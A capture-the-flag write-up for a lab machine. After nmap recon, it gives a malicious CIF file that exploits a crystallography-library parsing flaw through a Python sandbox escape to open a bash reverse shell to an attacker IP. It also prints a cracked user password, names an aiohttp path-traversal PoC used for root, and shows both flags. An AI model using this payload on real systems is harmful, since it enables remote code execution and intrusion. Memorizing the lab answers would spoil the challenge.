# Recon:
IP: 10.10.11.38```
nmap -sV 10.10.11.38 -T4
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-16 02:36 IST
Stats: 0:00:49 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 02:37 (0:00:41 remaining)
Stats: 0:01:32 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 02:38 (0:01:23 remaining)
Nmap scan report for 10.10.11.38
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)```
![[Pasted image 20241116030034.png]]

The given CIF file:```
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1```

Looking into CIF vuln; we find this link
https://github.com/advisories/GHSA-vgv8-5cpj-qj2f
![[Pasted image 20241116032039.png]]
# User Flag:
reading into this; our exploit code would be
```
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy




 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1
_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'sh >& /dev/tcp/10.10.14.250/4444 0>&1'");0,0,0'
_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "


stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset
```
![[Pasted image 20241116052443.png]]
upon uploading the file and acquiring a reverse shell and looking into directories we find database.db file which has the password hashed !
![[Pasted image 20241116052734.png]]
here we see both "App"and "rosa" hashed; i dehashed rosa to get its pass
`unicorniosrosados`
after getting rosa's pass we elevate into rosa, thereby retrieving the user flag.
![[Pasted image 20241116052938.png]]

userflag :`5f9e9a7223bc92c092fc3a246567906f`


# Root:
by using linpeas we see that there's a website running on localhost
![[Pasted image 20241116053432.png]]
using curl i found the server information
![[Pasted image 20241116053601.png]]
i immediately checked if the webserver had any vulns and discovered this.
https://github.com/s4botai/CVE-2024-23334-PoC
CVE-2024-2334 LFI/path traversal vuln itself lies in a way how aiohttp handles requests for static resources

so the files can be read by exploiting path traversal, even priv files; and as we neeed root.txt

![[Pasted image 20241116053824.png]]
the exploit worked. and we got the root flag

Root Flag: `4548f2bac4e15a7e9a1f8da4293d76cd`

Pretty late to the party but ![[Pasted image 20241116055233.png]]
It was a fun box.